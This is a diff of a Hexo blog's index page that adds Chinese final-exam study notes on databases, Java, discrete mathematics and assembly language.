@@ -7,7 +7,244 @@
     error: 'Copy error',
     noSupport: 'The browser does not support'
   }
-} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">78</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">汇编期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-30</time><div class="content"><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1.png" alt="1"></p>
+} </script><meta name="generator" content="Hexo 4.2.0"></head><body><i class="fa fa-arrow-right" id="toggle-sidebar" aria-hidden="true"></i><div id="sidebar"><div class="author-info"><div class="author-info__avatar text-center"><img src="/img/avatar.png"></div><div class="author-info__name text-center">George</div><div class="author-info__description text-center">Here recording my growth of technology and hope you can gain something here.</div><hr><div class="author-info-articles"><a class="author-info-articles__archives article-meta" href="/archives"><span class="pull-left">Articles</span><span class="pull-right">81</span></a><a class="author-info-articles__tags article-meta" href="/tags"><span class="pull-left">Tags</span><span class="pull-right">18</span></a><a class="author-info-articles__categories article-meta" href="/categories"><span class="pull-left">Categories</span><span class="pull-right">17</span></a></div></div></div><nav id="nav" style="background-image: url(https://Albatross-G.github.io/img/a1.png)"><div id="page-header"><span class="pull-left"> <a id="site-name" href="/">A.</a></span><i class="fa fa-bars toggle-menu pull-right" aria-hidden="true"></i><span class="pull-right menus"><a class="site-page social-icon search"><i class="fa fa-search"></i><span> Search</span></a><a class="site-page" href="/">Home</a><a class="site-page" href="/archives">Archives</a><a class="site-page" href="/tags">Tags</a><a class="site-page" href="/categories">Categories</a></span></div><div id="site-info"><div id="site-title">A.</div><div id="site-sub-title">Welcome to my blog.</div></div></nav><div id="content-outer"><div class="layout" id="content-inner"><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">数据库期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><div class="content"><h1 id="第一章"><a href="#第一章" class="headerlink" title="第一章"></a>第一章</h1><h2 id="数据库的三级模式和二级映射"><a href="#数据库的三级模式和二级映射" class="headerlink" title="数据库的三级模式和二级映射"></a>数据库的三级模式和二级映射</h2><p>数据库的三级模式</p>
+<ol>
+<li>用户级–&gt; 外模式(反映了数据库系统的用户观)</li>
+<li>概念级–&gt; 概念模式（反映了数据库系统的整体观)</li>
+<li>物理级 –&gt; 内模式（反映了数据库系统的存储观）</li>
+</ol>
+<p>数据库的两级映射</p>
+<ul>
+<li>模式/内模式的映像：实现概念模式到内模式之间的相互转换。</li>
+<li>外模式/模式的映像：实现外模式到概念模式之间的相互转换。</li>
+</ul>
+<p><img src="/2021/01/01/%E6%95%B0%E6%8D%AE%E5%BA%93%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1-1.png" alt="1-1"></p>
+<p>数据的独立性是指数据与程序独立，将数据的定义从程序中分离出来，由DBMS（数据库管理系统）负责数据的存储，从而简化应用程序，大大减少应用程序编制的工作量。</p>
+<p>数据的独立性是由DBMS的二级映像功能来保证的。数据的独立性包括数据的<strong>物理独立性</strong>和数据的<strong>逻辑独立性</strong>。</p>
+<blockquote>
+<p>什么是数据的物理独立性？</p>
+<p>答：数据的物理独立性是指当数据库的内模式发生改变时，数据的的逻辑结构不变。由于应用程序处理的只是数据的逻辑结构，这样物理独立性可以保证，当数据的物理结构改变了，应用程序不用改变。但是，为了保证应用程序能够正确执行，需要修改概念模式/内模式之间的映像。</p>
+<p>什么是数据的逻辑独立性？</p>
+<p>答：数据的逻辑独立性是指用户的应用程序与数据库结构是相互独立的。数据的逻辑结构发生变化后，用户程序也可以不修改。但是，为了保证应用程序能够正确执行，需要修改外模式/概念模式之间的映像。</p>
+</blockquote>
+<p>一句话总结一下：</p>
+<p><strong>通俗来讲就是如果改变了某个模式，只需要修改上一层的映像。即改变内模式，只需要修改模式/内模式映像（物理独立性），改变概念模式（逻辑结构），只需要修改外模式/模式映像（逻辑独立性）</strong></p>
+<h2 id="概念模型和逻辑模型"><a href="#概念模型和逻辑模型" class="headerlink" title="概念模型和逻辑模型"></a>概念模型和逻辑模型</h2><p>对现实世界抽象层次的不同,数据模型分为有<strong>概念模型</strong>和<strong>结构模型</strong></p>
+<p><strong>概念模型</strong>是一种独立于硬件和软件的模型,完全不涉及信息在系统中的表现,只是用来描述某个特定组织所关心的信息结构。这种模型是从用户的观点对数据建模,必须充分反映用户的需求,并得到用户的确认才可定下来。<strong>它是现实世界的第一层抽象</strong>,是用户和数据库设计人员之间进行交流的工具,其典型代表是<strong>ER模型</strong>。</p>
+<p><strong>结构模型</strong>用于描述数据库的逻辑结构,与DBMS有关。这种模型是从计算机的观点对数据建模。<strong>它是现实世界的第二层抽象</strong>,是数据库设计人员和应用程序员之间进行交流的工具。其典型代表是层次、网状、关系和面向对象模型。</p>
+<h2 id="常见缩写"><a href="#常见缩写" class="headerlink" title="常见缩写"></a>常见缩写</h2><p>数据库（DB）：长期存储在计算机内的有组织、可共享的数据集合。</p>
+<p>数据库管理员（DBA）</p>
+<p>数据库管理系统（DBMS）</p>
+<p>数据库系统（DBS）：一般由数据库、数据库管理系统（及其开发工具）、应用系统、数据库管理员构成。一般在不引起混淆的情况下常常把数据库系统简称为数据库。</p>
+<h2 id="关系模型"><a href="#关系模型" class="headerlink" title="关系模型"></a>关系模型</h2><p>特点：</p>
+<ul>
+<li>A.关系模型与非关系模型不同，它是建立在严格的数学概念的基础上的。</li>
+<li>B.关系模型的概念单一，无论实体还是实体之间的联系都用关系表示，操作的对象和操作的结果都是关系，所以其数据结构简单、清晰，用户易懂易用。</li>
+<li>C.关系模型的存取路径对用户透明，从而具有更高的数据独立性.更好的安全保密性，也简化了程序员的工作和数据库开发建立的工作。</li>
+</ul>
+<h2 id="基本概念"><a href="#基本概念" class="headerlink" title="基本概念"></a>基本概念</h2><h3 id="1-关系-Relation"><a href="#1-关系-Relation" class="headerlink" title="1)关系(Relation)"></a>1)关系(Relation)</h3><p>一个关系对应通常说的一张表</p>
+<h3 id="2-元组-Tuple"><a href="#2-元组-Tuple" class="headerlink" title="2)元组(Tuple)"></a>2)元组(Tuple)</h3><p>表中的一行即为一个元组</p>
+<h3 id="3-属性-Attribute"><a href="#3-属性-Attribute" class="headerlink" title="3)属性(Attribute)"></a>3)属性(Attribute)</h3><p>表中的一列即为一个属性，给每一个属性起一个名称，即属性名</p>
+<h3 id="4-码（键）"><a href="#4-码（键）" class="headerlink" title="4)码（键）"></a>4)码（键）</h3><p><strong>码是数据系统中的基本概念。所谓码就是能唯一标识实体的属性，他是整个实体集的性质，而不是单个实体的性质。它包括超码，候选码，主码。</strong></p>
+<ul>
+<li><strong>超码</strong>是一个或多个属性的集合，这些属性可以让我们在一个实体集中唯一地标识一个实体。</li>
+<li><strong>候选码</strong>:关系(表)中的某个属性组,它可以唯一确定一个元组。</li>
+<li>若一个关系(表)中有多个候选码,则选定其中一个为主码。</li>
+<li><strong>全码</strong>:关系的所有属性都包含在候选码中。</li>
+<li><strong>主属性</strong>:包含在任何一个候选码中的属性</li>
+<li><strong>非主属性</strong> 不包含在任何码中的属性</li>
+<li><strong>主码</strong>: 主键就是候选键里面的一个，是人为规定的，例如学生表中，我们通常会让“学号”做主键，教师表中让“教师编号”做主键。</li>
+<li><strong>外码</strong>： 外键比较简单，学生表中的外键就是“教师编号”。外键主要是用来描述两个表的关系。</li>
+<li><strong>域(Domain)</strong>:属性的取值范围。</li>
+<li><strong>分量</strong>:元组中的一个属性值。</li>
+<li><strong>形式化定义</strong><br>R(D 1 ,D 2 ,…D n )<br>R:关系名<br>n:关系的目或度(Degree)<br><strong>例:</strong><br>关系名(属性1,属性2,…,属性n)<br>学生(学号,姓名,年龄,性别,系,年级)<br><strong>候补码和超码</strong>：<br>候选码是从超码中选出的，自然地候选码也是一个或多个属性的集合。<br>因为超码的范围太广，很多是我们并不感兴趣即无用处的。所以候选码是最小超码，它们的任意真子集都不能成为超码。<br><strong>例如，如果K是超码，那么所有包含K的集合都不能是候选码；如果K，J都不是超码，那么K和J组成的集合（K，J）有可能是候选码。</strong></li>
+</ul>
+<h2 id="E-R图"><a href="#E-R图" class="headerlink" title="E-R图"></a>E-R图</h2><p>？？？</p>
+<h2 id="数据库的安全性、完整性、并发控制和恢复"><a href="#数据库的安全性、完整性、并发控制和恢复" class="headerlink" title="数据库的安全性、完整性、并发控制和恢复"></a>数据库的安全性、完整性、并发控制和恢复</h2><p>？？？</p>
+<h2 id="小点"><a href="#小点" class="headerlink" title="小点"></a>小点</h2><ol>
+<li>一个数据模型至少需要描述数据的静态特征、动态特征、完整性约束三项内容。</li>
+<li>DB是长期存储在计算机内的有组织、可共享的数据集合。</li>
+<li>关系数据库中的<strong>数据完整性</strong>是指<strong>数据的正确性</strong></li>
+<li><strong>数据结构</strong>是数据模型性质的最重要的描述。在数据库系统中，人们通常依据其类型来命名数据模型。</li>
+</ol>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">JAVA期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><div class="content"><h1 id="修饰符"><a href="#修饰符" class="headerlink" title="修饰符"></a>修饰符</h1><p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1.png" alt="1"></p>
+<h2 id="关键字：abstract"><a href="#关键字：abstract" class="headerlink" title="关键字：abstract"></a>关键字：abstract</h2><p>用来修饰<strong>抽象类</strong>与<strong>抽象类中的方法</strong>【不能修饰变量】</p>
+<p><strong>抽象类需要注意的几点：</strong></p>
+<ol>
+<li>抽象类不能被实例化。抽象类可以包含属性；方法；构造方法，但是构造方法不能用来new实例，只能被子类调用</li>
+<li>有抽象方法的类，一定是抽象类，但是抽象类可以没有抽象方法。</li>
+<li>当一个类继承的父类是抽象类的话，需要我们把抽象类中的所有抽象方法全部实现，除非子类也为抽象类。</li>
+<li>抽象方法不能有方法体。</li>
+<li>抽象类不能用final声明，因为抽象类只有被继承才有存在的意义，final修饰的 </li>
+</ol>
+<p>类不可以被继承</p>
+<h2 id="关键字：final"><a href="#关键字：final" class="headerlink" title="关键字：final"></a>关键字：final</h2><p>用来修饰类，类属性，类方法</p>
+<p><strong>注意：</strong></p>
+<ol>
+<li><p>被final修饰的<strong>类</strong>不能被继承。</p>
+</li>
+<li><p>final修饰的<strong>类方法</strong>不能被重写，子类只有调用final方法的权利，没有修改final方法 的权利</p>
+</li>
+<li><p>被final修饰的<strong>类属性</strong>只可在初始化赋值，不可被重新赋值</p>
+</li>
+<li><p>使用final修饰<strong>引用型变量</strong>，变量不可以指向另外的对象</p>
+</li>
+</ol>
+<h1 id="重载和重写"><a href="#重载和重写" class="headerlink" title="重载和重写"></a>重载和重写</h1><p>java中的方法重载发生在<strong>同一个类里面</strong>两个或者多个方法的<strong>方法名相同</strong>但是<strong>参数不同</strong>的情况。</p>
+<p>与此相对，方法覆盖是说<strong>子类重新定义了父类的方法</strong>。方法覆盖必须有<strong>相同的方法名，参数列表和返回类型</strong>。</p>
+<p>覆盖者可能不会限制它所覆盖的方法的访问。</p>
+<h2 id="重载（Overloading）"><a href="#重载（Overloading）" class="headerlink" title="重载（Overloading）"></a>重载（Overloading）</h2><ul>
+<li>（1）方法重载是让类以统一的方法处理不同类型数据的一种手段。多个同名函数同时存在，具有不同的参数个数（类型）。重载Override是一个类中多态性的一种表现。</li>
+<li>（2）java的方法重载，就是在类中可以创建多个方法，他们具有相同的名字，但具有不同参数和不同的定义。调用方法时通过传递给他们不同的参数个数和参数类型来决定具体使用那个方法，这就是多态性。</li>
+<li>（3）重载的时候，方法名要一样，但是参数类型和个数不一样，返回值类型可以相同也可以不同。无法以返回类型来作为重载函数的区分标准。</li>
+</ul>
+<h2 id="重写（Overriding）"><a href="#重写（Overriding）" class="headerlink" title="重写（Overriding）"></a>重写（Overriding）</h2><ul>
+<li>（1）父类与子类的多态性，对父类的函数进行重新定义。如果在子类中定义某方法与其父类有相同的名称和参数，我们说该方法被重写。在java中，子类可继承父类的方法，则不需要重新编写相同的方法。但有时子类并不想原封不动继承父类的方法，而是想做一定的修改，这就采用方法重写。方法重写又称方法覆盖。</li>
+<li>（2）若子类中的方法与父类的中的某一方法具有相同的方法名、返回类型和参数表，则新方法覆盖原有的方法。如需要父类的原有方法，可以使用super关键字，该关键字引用房钱类的父类。</li>
+<li>（3）子类函数访问权限大于父类。</li>
+</ul>
+<h1 id="小点"><a href="#小点" class="headerlink" title="小点"></a>小点</h1><ol>
+<li><p>在使用interface声明一个接口时，只可以使用public/default修饰符修饰该接口。</p>
+</li>
+<li><p>String实例一旦创建完毕，就不能再修改其内容</p>
+</li>
+<li><p>不允许使用final来修饰abstract方法</p>
+</li>
+<li><p>接口中的方法默认都是public、abstract类型的。【非静态】</p>
+</li>
+<li><p>抽象类不一定有抽象方法。</p>
+</li>
+<li><p>为AB类的一个无形式参数无返回值的方法method书写方法头，使得使用类名AB作为前缀就可以调用它，该方法头的形式为（static ）。</p>
+</li>
+<li><blockquote>
+<p>接口Interface<br>\1. 接口中的<strong>成员变量</strong>默认都是public、static、final类型的，必须被显式初始化<br>\2. 接口中的<strong>方法</strong>默认都是public、abstract类型的。<br>\3. 接口中只能包含public、static、final类型的成员变量和public、abstract类型的成员方法。<br>\4. 接口没有构造方法，不能被实例化，在接口中定义构造方法是非法的。<br>\5. 一个接口不能实现另一个接口，但它可以继承多个其他接口。<br>interface C extends A, B{} // A和B都是接口<br>\6. 当类实现某个接口时，它必须实现接口中所有的抽象方法，否则这个类必须被定义为抽象类。<br>\7. 接口中没有方法体<br>访问控制修饰符<br>四种访问级别：public、protected、默认、private<br>private只能在同一个类中访问<br>默认，只能在同一个类，同一个包中访问<br>protected，可以在统一各类，同一个包，子类(子类可以不在同一个包中)访问<br>public，不限制访问<br>类可用修饰符： abstract、public、final<br>构造方法：public、protected、private<br>局部变量：仅仅final<br>abstract修饰符<br>\1. 抽象类中可以没有抽象方法，但包含了抽象方法的类必须被定义为抽象类。<br>\2. 没有抽象构造方法，没有抽象静态方法。 static 和 abstract不能连用<br>\3. 抽象类中可以有非抽象的构造方法，创建子类的实例时可能会调用这些构造方法。<br>\4. 抽象类及抽象方法不能被final修饰符修饰。final和abstract 不能连用，同样private和abstract不能连用。<br>\5. 抽象类不能被实例化。因为抽象类可能含有没有方法体的抽象方法<br>final修饰符<br>final具有;不可改变的;含义，它可以修饰非抽象类，非抽象成员方法和变量<br>\1. 用final修饰的类不能被继承，没有子类。<br>\2. 用final修饰的方法不能被子类的方法覆盖。<br>\3. 用final修饰的变量表示常量，只能被赋一次值，必须被显式初始化。<br>\4. private修饰的方法默认为是final方法，因而不能被子类的方法覆盖。<br>static修饰符<br>\1. 静态变量在内存中只有一个拷贝，在类的所有实例中共享。<br>\2. 在静态方法中不能直接访问实例方法和实例变量。<br>\3. 在静态方法中不能使用this和super关键字。<br>\4. 静态方法不能被abstract修饰<br>\5. 静态方法和静态变量都可以通过类名直接被访问。<br>\6. 当类被加载时，静态代码块只被执行一次。类中不同的静态代码块按它们在类中出现的顺序被依次执行<br>public static void main(String args[]) {} 程序入口方法，可以被final修饰。<br>super关键字<br>\1. 在类的构造方法中，通过super语句调用这个类的父类的构造方法。<br>在构造方法中，super语句必须作为构造方法的第一条语句。<br>\2. 在子类中访问父类的被屏蔽的方法和属性<br>\3. 只能在构造方法或实例方法内使用super关键字。 super关键字与类的特定实例相关<br>方法覆盖（方法重写）<br>\1. 方法的参数签名和返回值类型必须相同，访问控制修饰符可以不同，但是子类方法不能缩小父类方法的访问权限。<br>\2. 子类方法抛出的异常必须和父类方法抛出的异常相同，或者是父类方法抛出的异常类的子类。<br>\3. 父类的静态方法是不能被子类覆盖为非静态方法。<br>父类的非静态方法不能被子类覆盖为静态方法。<br>\4. 子类可以定义与父类的静态方法同名的静态方法，以便在子类中隐藏父类的静态方法。区别：运行时，JVM把静态方法和所属的类绑定，而把实例方法和所属的实例绑定。<br>\5. 父类的私有方法不能被覆盖<br>\6. 父类的非抽象方法可以被覆盖为抽象方法<br>方法重（chong）载<br>\1. 在一个类中不允许两个方法名相同，并且参数签名也完全相同的方法。<br>\2. 类的同一种功能，可能有多种实现，到底采用哪种实现方式，取决于调用者给定的参数。<br>\3. 对于类的方法（包括从父类中继承的方法），如果有两个方法的方法名相同，但参数不一致，那么可以说，一个方法是另一个方法的重载方法。<br>多态<br>\1. 对于一个引用类型的变量，Java编译器按照它声明的类型来处理。<br>Base base = new Sub();<br>base.subMethod(); // 编译出错，Base基类，Sub子类，编译器认为base是Base类型的引用变量，Base类没有subMethod()方法。这样子，就必须使用强制转换。(Sub)(base).subMethod();<br>\2. 对于一个引用类型的变量，运行时JVM按照它实际引用的对象来处理。<br>Base base = new Base();<br>Sub sub = (Sub)base; // 编译通过，但是运行时抛出ClassCastException<br>在运行时，子类的引用类型变量可以转换为父类的引用类型，而相反的过程却不可以。<br>假定可以，即上边两行代码运行正常，那么sub.subMethod(); 执行时，JVM将找不到subMethod。sub实际引用的是Base类的实例。<br>\3. 在运行时环境中，通过引用类型变量来访问所引用对象的方法和属性时，JVM采用以下的绑定规则。<br>①实例方法与引用变量实际引用的对象的方法绑定，即动态绑定。<br>②静态方法与引用变量所声明的类型的方法绑定，即静态绑定。 编译阶段即绑定完成。<br>③成员变量(静态变量和实例变量) 与引用类型所声明的类型的成员变量绑定。静态绑定。</p>
+</blockquote>
+</li>
+</ol>
+<h1 id="问题"><a href="#问题" class="headerlink" title="问题"></a>问题</h1><p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2.png" alt="2"></p>
+<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3.png" alt="3"></p>
+<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/4.png" alt="4"></p>
+<p><img src="/2021/01/01/JAVA%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/5.png" alt="5"></p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">离散数学期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2021-01-01</time><div class="content"><h1 id="代数"><a href="#代数" class="headerlink" title="代数"></a>代数</h1><h2 id="定义"><a href="#定义" class="headerlink" title="定义"></a>定义</h2><p>本章中定义<code>A=&lt;S，。，▲，k&gt;</code>，其中。是S上的二元运算，▲是S上的一元运算。</p>
+<h2 id="代数结构"><a href="#代数结构" class="headerlink" title="代数结构"></a>代数结构</h2><p>代数通常由以下三部分组成：</p>
+<ol>
+<li>一个集合，叫做代数的<strong>载体</strong></li>
+<li>定义在载体上的<strong>运算</strong></li>
+<li>载体的特异元素，叫做<strong>代数常数</strong></li>
+</ol>
+<blockquote>
+<p>例：</p>
+<ol>
+<li>载体是整数集合I</li>
+<li>定义在I上的运算是加法</li>
+<li>常数是0</li>
+</ol>
+<p>可构成代数系统：&lt;I,+,0&gt;</p>
+</blockquote>
+<h2 id="子代数"><a href="#子代数" class="headerlink" title="子代数"></a>子代数</h2><p>设<code>A=&lt;S，。，▲，k&gt;</code>是一个代数，如果</p>
+<ol>
+<li>S‘ 属于S</li>
+<li>S’对于S上的运算。，▲封闭</li>
+<li>k∈S’</li>
+</ol>
+<p>则称<code>A&#39;=&lt;S&#39;，。，▲，k&gt;</code>是A的子代数</p>
+<h2 id="同态"><a href="#同态" class="headerlink" title="同态"></a>同态</h2><h3 id="同构"><a href="#同构" class="headerlink" title="同构"></a>同构</h3><p>代数<code>A=&lt;S，*，▲，k&gt;</code>和<code>A&#39;=&lt;S&#39;，*&#39;，▲&#39;，k&#39;&gt;</code>是<strong>同构</strong>的，如果存在一<strong>双射函数h</strong>，使</p>
+<ol>
+<li>h： S-&gt;S’</li>
+<li>h(a * b)=h(a) *’ h(b)</li>
+<li>h(▲a)=▲’h(a)</li>
+<li>h(k)=k’</li>
+</ol>
+<p>这里a，b是S上的任意元素</p>
+<blockquote>
+<p>设f是从集合A到集合B的映射，若f(A)=B，即B中任一元素b都是A中某元素的像，则称f为A到B上的<strong>满射</strong>；</p>
+<p>若对A中任意两个不同元素a1不等于a2，它们的像f1不等于f2，则称f为A到B的<strong>单射</strong>；</p>
+<p>若映射f既是单射，又是满射，则称映射f为A到B的“双射”(或“一一映射)”)。 函数为双射当且仅当每个可能的像有且仅有一个变量与之对应。</p>
+</blockquote>
+<h3 id="同态-1"><a href="#同态-1" class="headerlink" title="同态"></a>同态</h3><p>代数<code>A=&lt;S，*，▲，k&gt;</code>和<code>A&#39;=&lt;S&#39;，*&#39;，▲&#39;，k&#39;&gt;</code>是<strong>同态</strong>的，如果存在一函数<strong>h</strong>，使</p>
+<ol>
+<li>h： S-&gt;S’</li>
+<li>h(a * b)=h(a) *’ h(b)</li>
+<li>h(▲a)=▲’h(a)</li>
+<li>h(k)=k’</li>
+</ol>
+<p>这里a，b是S上的任意元素</p>
+<p>其中：</p>
+<ol>
+<li>如果h是单射的，则h是单一同态</li>
+<li>如果h是满射的，则h是满同态</li>
+<li>如果A=A’，则h是自同态</li>
+</ol>
+<h2 id="半群和独异点"><a href="#半群和独异点" class="headerlink" title="半群和独异点"></a>半群和独异点</h2><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-1.png" alt="6-1" style="zoom:50%;">
+
+<p>生成元：设<code>&lt;S，*，e&gt;</code>是独异点，如果存在一个元素g，对于每一个元素a∈S，都有一个相应的h∈N能满足a=g^h，则称此独异点为<strong>循环独异点</strong>。并称元素g为此循环独异点的<strong>生成元</strong>。</p>
+<h2 id="群"><a href="#群" class="headerlink" title="群"></a>群</h2><h3 id="概念："><a href="#概念：" class="headerlink" title="概念："></a>概念：</h3><p>代数系统满足：</p>
+<ol>
+<li>封闭，可结合</li>
+<li>有幺元</li>
+<li>有逆元</li>
+</ol>
+<h3 id="性质"><a href="#性质" class="headerlink" title="性质"></a>性质</h3><ol>
+<li><p>如果&lt;G,*&gt;是一个群，则对于任何a，b∈G，<code>(a * b)^-1 = b^-1 * a^-1</code></p>
+</li>
+<li><table>
+<thead>
+<tr>
+<th>阶数</th>
+<th>群的个数</th>
+<th>是否为阿贝尔群</th>
+</tr>
+</thead>
+<tbody><tr>
+<td>1</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>2</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>3</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>4</td>
+<td>2</td>
+<td>1</td>
+</tr>
+<tr>
+<td>5</td>
+<td>1</td>
+<td>1</td>
+</tr>
+<tr>
+<td>6</td>
+<td>2</td>
+<td>0</td>
+</tr>
+</tbody></table>
+</li>
+<li><p>如果&lt;G,*&gt;是一个群，且a∈G，如果存在正整数n使得a^n=e，则称元素的阶是有限的。如果不存在这样的n，则称元素的阶是无限的。</p>
+</li>
+<li><p>群中任一元素和它的逆元具有相同的阶</p>
+</li>
+</ol>
+<h3 id="置换群和循环群"><a href="#置换群和循环群" class="headerlink" title="置换群和循环群"></a>置换群和循环群</h3><p>置换群：n阶置换群有n！个</p>
+<p>置换群的乘法：</p>
+<p><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-2.png" alt="6-2"></p>
+<p>注：这个为左合成，右合成过程相反。</p>
+<h4 id="定义-1"><a href="#定义-1" class="headerlink" title="定义"></a>定义</h4><p>给定n个元素组成的集合A，A上的置换所构成的群称为<strong>n次置换群</strong>；A上所有置换构成的群称为<strong>n次对称群</strong>。</p>
+<h3 id="子群和群同态"><a href="#子群和群同态" class="headerlink" title="子群和群同态"></a>子群和群同态</h3><h4 id="子群"><a href="#子群" class="headerlink" title="子群"></a>子群</h4><ol>
+<li>若群&lt;G,*&gt;为有限群，对于任意元素a，b∈S，有a * b∈S，那么&lt;S, *&gt;是&lt;G, * &gt;的子群。</li>
+<li>若群&lt;G,*&gt;不确定为有限群，对于任意元素a，b∈S，有a * b∈S 和 若a∈S，那么a^-1∈S，那么&lt;S, *&gt;是&lt;G, * &gt;的子群。</li>
+</ol>
+<h4 id="群同态"><a href="#群同态" class="headerlink" title="群同态"></a>群同态</h4><p>只要满足h(a*b) = h(a) *’ h(b)</p>
+<h3 id="陪集和拉格朗日定理"><a href="#陪集和拉格朗日定理" class="headerlink" title="陪集和拉格朗日定理"></a>陪集和拉格朗日定理</h3><p><img src="/2021/01/01/%E7%A6%BB%E6%95%A3%E6%95%B0%E5%AD%A6%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-3.png" alt="6-3"></p>
+<p>拉格朗日定理：子群的阶数是群阶数的因子</p>
+</div><hr></div><div class="recent-post-item article-container"><a class="article-title" href="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/">汇编期末复习</a><time class="post-meta__date"><i class="fa fa-calendar" aria-hidden="true"></i> 2020-12-30</time><div class="content"><h1 id="第四章"><a href="#第四章" class="headerlink" title="第四章"></a>第四章</h1><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/1.png" alt="1"></p>
 <p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/2.png" alt="2"></p>
 <p>间接寻址</p>
 <p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/3.png" alt="3"></p>
@@ -19,6 +256,18 @@
 <p>例子</p>
 <p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/8.png" alt="8"></p>
 <p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/9.png" alt="9"></p>
+<h1 id="第五章"><a href="#第五章" class="headerlink" title="第五章"></a>第五章</h1><h2 id="pop-push"><a href="#pop-push" class="headerlink" title="pop/push"></a>pop/push</h2><p>堆栈是预先分配好的一段内存地址，其中<strong>栈底的地址最大</strong>。</p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-1.png" alt="6-1"></p>
+<p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-2.png" alt="6-2"></p>
+<blockquote>
+<p>在vs2017调试的时候，如果要看字符串的值，需要输入字符串的首地址。</p>
+<p>比如查看名为Name的字符串，可以快速监视  <code>&amp;Name</code></p>
+</blockquote>
+<h2 id="call-ret"><a href="#call-ret" class="headerlink" title="call/ret"></a>call/ret</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-4.png" alt="6-4"></p>
+<h2 id="标号"><a href="#标号" class="headerlink" title="标号"></a>标号</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-5.png" alt="6-5"></p>
+<h2 id="寄存器实现参数传递"><a href="#寄存器实现参数传递" class="headerlink" title="寄存器实现参数传递"></a>寄存器实现参数传递</h2><p><img src="/2020/12/30/%E6%B1%87%E7%BC%96%E6%9C%9F%E6%9C%AB%E5%A4%8D%E4%B9%A0/6-6.png" alt="6-6"></p>
